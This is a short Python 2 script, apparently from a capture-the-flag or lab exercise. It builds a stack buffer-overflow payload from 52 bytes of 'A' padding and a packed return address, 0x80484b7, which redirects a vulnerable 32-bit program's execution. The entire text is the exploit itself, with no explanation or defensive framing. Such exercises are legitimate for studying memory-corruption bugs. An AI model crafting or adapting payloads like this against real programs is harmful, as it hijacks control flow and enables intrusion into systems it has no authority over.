import struct
padding = "A" * 52
printAddress = struct.pack("I", 0x80484b7)
print padding+printAddress
